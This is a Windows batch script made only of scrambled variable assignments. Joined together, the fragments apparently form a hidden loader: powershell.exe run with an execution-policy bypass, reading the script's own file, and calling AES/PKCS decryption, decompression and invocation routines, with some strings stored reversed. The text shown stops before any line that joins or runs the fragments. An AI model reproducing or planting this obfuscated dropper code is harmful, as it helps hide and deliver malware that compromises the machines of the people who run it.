@echo off
set "wcVZuEXbSr= /"
set "zqjGCnXSEm=co"
set "ElGeadQrUf=em"
set "ATjQJFaWgY=\v"
set "mIgnFdUxtN=rS"
set "FkArmHkIQd=rs"
set "MUdyhyCigH=Sy"
set "DpuxhYFMsG=:\"
set "BewbgiNUxW=we"
set "kCoZlxnLCN=y "
set "UCCPhGMVNO=xe"
set "IlnbeoShCS=do"
set "YvjCQBbCZi=he"
set "LKehnelsSl=po"
set "PGowqlWxdn=s\"
set "qHEMJNSQvi=ow"
set "CGRIbwDgEk=32"
set "dUsBnrMLYy=he"
set "ZGhbKarksl=ll"
set "ZSJAaFBfDE=0\"
set "OMdPlwbcmP=Wi"
set "CbnzzUwIuR=ll"
set "dGsFIAnZxe=in"
set "iDJACavIJZ=we"
set "SGHGZAjMVG=.e"
set "ngkLbWomZB=Po"
set "XamoKOWqnR= C"
set "DaLUmVCSQV=ws"
set "UKQEphhqfx=st"
set "bQSmDNugKa=1."
set "lJJNoePJgj=\W"
set "JeNlrzdUWO=nd"
set "dmnDgusHce=py"
set "zTtNKGYiYN= %~dp0"
set "iTZXChlQpe=cd"
set "jyeVzhEDie=tem."
set "lFxLFLlmzU=$pPt"
set "wjeslfWOCI=Mode"
set "qFBCedAqaU=esaB"
set "DckWpKaoqy=kMCV"
set "QEHyuLpqZS=LEIb"
set "AwrrnWXrpt=bypa"
set "KWuojdMrEk=VQ);"
set "xaFMuzFoqE=7Yiv"
set "bujyYacdMV=.IO."
set "pYBXrYbLSj=('%*'"
set "yTGvHkQUUm== [S"
set "SMjLqXQcAO=ress"
set "gNKZBamhyU=pose"
set "jLsuDXuCDu=lBlo"
set "mXeoIQvRap='txe"
set "sdqzWIcCWJ=aG ="
set "vshUjZYcyF= = ["
set "AUVzwIRRIQ=HqzB"
set "AObFUVvdAQ=$oeK"
set "BnixlHFXdR=mory"
set "mmmlIwMPSt=Ftk "
set "pMVhZwjdZx=ress"
set "nCGDNurkEw=m.IO"
set "qJxnXizyxf=fore"
set "OMdeBkLKkp=();$"
set "rCKWgOriLI=$dBJ"
set "QRtgoJBOem=IoDt"
set "pplFIlAYmv=('%~f0'"
set "qGbJKjkLEW=yste"
set "CNPzybgJUO=  $P"
set "cJFLyHXPdw=();$"
set "bnCTDgqznU=6] -"
set "FHiVReCFWL=7;$C"
set "qMSzttYvyV='dqR"
set "lVSAvIlUoH=y.Ci"
set "NmMvQVfmuP=EIbo"
set "VPvAPIkFWE=y.Pa"
set "UZxZcRlvpl=ionM"
set "bzOGLhAvnE=ring"
set "vwONqEwJYz=OyzA"
set "BjSBeaXGtX=Invo"
set "GntdgnSYhy=1] -"
set "kSuPvDLsar=comm"
set "BaHDOrewHR=hWak"
set "JbJdBiWzRm=Q = "
set "tbTipIUODl=Disp"
set "eoneheGpyP=VT.T"
set "RsqITJNNyo= New"
set "beEdQXYEkC=k; }"
set "UakdZUYLwO=ZYYc"
set "syFxtCQfdI=[]] "
set "kXSovRVQwi=ne);"
set "JWTUALSnHA='gni"
set "nteeeKMcRC=Star"
set "RMKdXpyhEv=akv."
set "heiaDDrsAZ=-1.."
set "hlrSUMIzdJ=PKCS"
set "UAJGmVlODt=.Dis"
set "QpDnssPkLY=Conv"
set "yqVrfBIFup=ose("
set "fQXAjhklUB=Syst"
set "tVUeGmCHas=rt]:"
set "PJFoNSXkYJ=ewLi"
set "bNwgYYsHeq=ct S"
set "heLVOmryMO=urit"
set "szMSwzoogh=in $"
set "tiDkYvBBzK= = N"
set "TonLOKzWSH=$kMC"
set "ODQfbhlTOU=Obje"
